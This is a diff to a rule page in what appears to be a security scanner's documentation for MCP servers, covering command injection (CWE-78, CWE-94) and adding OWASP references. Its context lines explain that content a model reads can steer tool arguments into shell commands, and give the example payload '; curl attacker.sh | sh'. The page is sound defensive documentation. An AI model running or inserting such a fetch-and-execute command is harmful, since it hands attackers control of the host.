@@ -1,6 +1,6 @@
 # MCPG004: command-injection
 
-**Default severity:** critical (shell / eval), high (model chooses the program) · **CWE:** [CWE-78](https://cwe.mitre.org/data/definitions/78.html), [CWE-94](https://cwe.mitre.org/data/definitions/94.html)
+**Default severity:** critical (shell / eval), high (model chooses the program) · **CWE:** [CWE-78](https://cwe.mitre.org/data/definitions/78.html), [CWE-94](https://cwe.mitre.org/data/definitions/94.html) · **OWASP:** [MCP05, LLM05, ASI05](../owasp.md)
 
 A model-controlled value is interpolated into a shell command, evaluated as code, or used as the program to execute. Tool arguments come from the LLM, so anyone who can influence the conversation or the content the model reads can run commands on the host. A single `; curl attacker.sh | sh` is enough.
 
